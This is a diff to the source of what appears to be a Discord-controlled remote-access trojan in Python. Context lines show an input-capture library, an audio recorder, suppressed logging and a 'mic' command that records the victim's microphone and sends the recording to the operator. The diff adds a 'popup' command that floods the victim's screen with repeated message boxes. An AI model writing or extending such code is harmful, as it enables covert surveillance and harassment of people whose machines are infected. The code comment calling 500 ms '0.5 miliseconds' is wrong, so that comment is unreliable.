@@ -26,6 +26,8 @@ import pynput
 import pyaudio
 import wave
 import threading
+import tkinter as tk
+from tkinter import messagebox
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -514,6 +516,22 @@ async def mic(ctx):
         os.remove(AUDIO_FILE)
     else:
         await ctx.send("No audio file was created.")
+
+def show_popup(title, content, times):
+    
+    root = tk.Tk()
+    root.withdraw()  
+
+    
+    for _ in range(times):
+        messagebox.showinfo(title, content)
+        
+        root.after(500)  # 0.5 miliseconds bttw
+        root.update()  
+
+@bot.command()
+async def popup(ctx, title: str, content: str, times: int):
+    show_popup(title, content, times)
 
 
 bot.run(TOKEN)
